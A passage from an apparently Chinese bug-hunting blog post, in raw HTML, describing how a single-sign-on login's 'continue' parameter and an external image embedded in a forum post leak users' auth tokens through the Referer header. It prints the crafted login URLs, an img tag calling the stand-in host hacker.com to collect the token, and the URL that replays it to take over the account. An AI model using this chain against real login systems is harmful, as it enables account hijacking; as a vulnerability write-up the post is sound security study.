rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">continue</code>的值可以是AAA.com下的任意子域名(还有一些指定的白名单跨域域名)，那么首先能想到的就是如果我们能找到AAA.com下的一个跳转漏洞，那么是不是就可以在跳转后把授权给传送出去呢？</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">于是找了几个子域名下的跳转：<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://subdomian.AAA.com/topLocation?location=687474703a2f2f7777772e62616964752e636f6d</code>这个链接访问后会跳转到百度，于是将其值给<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">continue</code>，确实是可以跳转，但是跳转后的结果却是</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">http://subdomain.AAA.com/topLocation?auth=xxxxxx&amp;isiframe=1&amp;location=687474703a2f2f737562646f6d61696e2e4141412e636f6d2f<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">浏览器再进而请求<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://subdomain.AAA.com/topLocation?location=687474703a2f2f742e77616e6d65692e636f6d2f</code></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">看到没，授权值是/topLocation?auth=xxxx而不是<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://www.baidu.com/?auth=xxxx</code>或者是<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://subdomian.AAA.com/topLocation?location=687474703a2f2f7777772e62616964752e636f6d&amp;auth=xxxx</code>，也就是说服务端只获取了?(问号)前面的值而后面的直接丢弃，导致跳转失效了，自然授权值也就传不出去了。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">又重新找了几个通过参数进行跳转的跳转漏洞，结果都是?之后被截断，这条路也就行不通了，除非能找到一个不带?的跳转，这个就比较难了，直接放弃。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">再想想还有什么办法获取到这个授权值呢？对了，网站在跨域请求网站内容时会通过referer来标记来源，如果当前发起请求的页面链接中存在授权值，则referer也会记录该值！</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">上面的跳转漏洞，由于授权值是返回给<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://subdomian.AAA.com/</code>，完了之后才对外跳转，referer是不含有该授权值的。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">陆续又找了几个跳转漏洞，由于包含多重跳转，到最后referer带的都不是我们想要的数据了。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">思路又断了，这时候又突然想到，在AAA.com域名下是有很多bbs的二级域名站点的，如果能在bbs站点插入对外的请求，那么是不是有机会把数据传出去呢？</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">刚好<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">bbs.subdomain.AAA.com</code>这个站点允许插入外链图片</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.3909426987060998" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/2_uaHRWdgbMCp5Fibyg98YsPRqI18PAA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPa1XzbaGaRxy3kVKWudaYufxrnuaHRWdgbMCp5Fibyg98YsPRqI18PAA/640?wx_fmt=png'" data-type="png" data-w="1082" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">插入的图片html代码如下</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">&lt;img id="aimg_gyvvi" onclick="zoom(this, this.src, 0, 0, 0)" class="zoom" width="440" height="440" src="http://hacker.com/jpg/12345.jpg" border="0" alt=""&gt;<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">最后构造链接：</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">https://passport.AAA.com/sso/accounts/serviceLogin?continue=http://bbs.subdomain.AAA.com/thread-942592-1-1.html&amp;isiframe=1&amp;service=service_id&amp;location=687474703a2f2f7777772e62616964752e636f6d&amp;CSSStyle=https://static.xxx.AAA.com/sso/subdomain/style/login_t_cover160316.css<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">访问后Referer如下：</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">http://bbs.subdomain.AAA.com/thread-942592-1-1.html?auth=xxxxxx&amp;isiframe=1&amp;location=687474703a2f2f7777772e62616964752e636f6d<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">referer成功附带授权数据。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">获取到授权后，只需要在正常的模拟一次授权过程，把接收授权返回值的接口找出来，把通过referer获取到的auth值喂给它，即可登录对应用户的账户：</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">http://subdomain.AAA.com/SSOServerLogin?auth=xxxxxxxx&amp;isiframe=1&amp;location=687474703a2f2f7777772e62616964752e636f6d<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">上面的文字内容偏多，可能读起来费劲，以下为图文并茂内容。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">可被黑客劫持用户授权的站点：http://<em style="transition: all 0.1s ease 0s;">.AAA.com/ http://</em>.BBB.com/</p><h4 style="font-weight: 600;line-height: 1.7;font-size: 1.25rem;margin-top: 0.625rem;margin-bottom: 0.5rem;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>漏洞细节：</strong></h4><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">AAA.com支持通过 “通行证”登录旗下各个站点，登录口是&nbsp;<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">https://passport.AAA.com/</code></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在我们要登录<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://subdomain.AAA.com/</code>时就可以看到该接口</p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.43923240938166314" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/3_U7LhAI7xULAkfAWSkdC2tbLShcPYjQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPjoKAqmZoljvUkoRrorKdS9ZqU7LhAI7xULAkfAWSkdC2tbLShcPYjQ/640?wx_fmt=png'" data-type="png" data-w="469" style=""  /></p><h5 style="font-weight: 600;line-height: 1.7;font-size: 1.15rem;margin-top: 0.575rem;margin-bottom: 0.46rem;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>【1】前期准备</strong><br  /></h5><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">一个“通行证”账号 登录后在子域名论坛发了个帖子&nbsp;<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://bbs.subdomain.AAA.com/thread-942592-1-1.html</code></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.8944954128440367" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/4_ayrJcgu4iaUibVHg3HrjeU7bRKyPpg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPJvsbU1SQe4w7141iaghMyLTOsXXiayrJcgu4iaUibVHg3HrjeU7bRKyPpg/640?wx_fmt=png'" data-type="png" data-w="872" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">帖子嵌入了一个外链图片</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.6008298755186722" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/5_bYGZnmfcwsf0RIjTibjoe3Y9T7k3gA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPGCTXWE4TamXVsv81niaMWYATc4ibYGZnmfcwsf0RIjTibjoe3Y9T7k3gA/640?wx_fmt=png'" data-type="png" data-w="1205" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">当这个页面被请求时，浏览器就会对外请求该图片&nbsp;<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://hacker.com/jpg/12345.jpg</code></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后黑客服务器可以通过记录referer来得知是哪一个站点发起的请求，即referer的数据都可得。</p><h5 style="font-weight: 600;line-height: 1.7;font-size: 1.15rem;margin-top: 0.575rem;margin-bottom: 0.46rem;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">【2】</h5><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在已经登录<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">https://passport.AAA.com/</code>的情况下 (1)访问</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">https://passport.AAA.com/sso/accounts/serviceLogin?continue=http://bbs.subdomain.AAA.com/thread-942592-1-1.html&amp;isiframe=1&amp;service=service_id&amp;location=687474703a2f2f737562646f6d61696e2e4141412e636f6d2f&amp;CSSStyle=https://static.xxx.AAA.com/sso/subdomain/style/login_t_cover160316.css<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">简单介绍一下<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">continue</code>参数指向的是我上面发布的那个帖子，<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">location</code>的值是通过网站的函数编码过的<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://subdomain.AAA.com/</code></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">访问后，授权的数据就会自动附带在链接中如下：</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.5890625" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/6_vMmyn7GfzB2zx3LM90RM1JMDtvIOqQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPbmKAgpibaFfUVYUL3P43pTibThvMmyn7GfzB2zx3LM90RM1JMDtvIOqQ/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">可以看到在请求这张对外的图片时，也把授权用的<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">auth</code>等参数的值以referer的方式向网站发起了请求，而我们只需要在服务器记录请求即可获取到改值。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">获取到这些值后：&nbsp;<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">auth=xxxx&amp;isiframe=1&amp;location=687474703a2f2f737562646f6d61696e2e4141412e636f6d2f</code></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">我们在浏览器的隐身窗口(以保证我们没有登录passport.AAA.com)中打开如下链接：</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">http://subdomain.AAA.com/SSOServerLogin?auth=xxxx&amp;isiframe=1&amp;location=687474703a2f2f737562646f6d61696e2e4141412e636f6d2f<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">即可登录对应账号在<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">subdomain.AAA.com</code>的用户中心</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.60703125" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/7_xlOZH2MVTIXnpruzchbic5aXbPM5lQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPe6QhtWORKg6m1ZdIibb3m4jiaC3xlOZH2MVTIXnpruzchbic5aXbPM5lQ/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.41875" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/8_mvX9gOQlE4hyI90l6gklvrDDgZwUnQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPibqVqQpV9eu4Yhuib6Vgfmedl1mvX9gOQlE4hyI90l6gklvrDDgZwUnQ/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">(2)访问<br  /></p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">http://passport.AAA.com/sso/accounts/serviceLogin?continue=http://bbs.subdomain.AAA.com/thread-942592-1-1.html&amp;service=service_id&amp;isiframe=1&amp;location=687474703a2f2f7777772e4242422e636f6d2f<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这里<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">continue</code>还是指向我的帖子，<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">service</code>指定为对应站点，<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">location</code>的值为默认</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.578125" data-s="300,640" 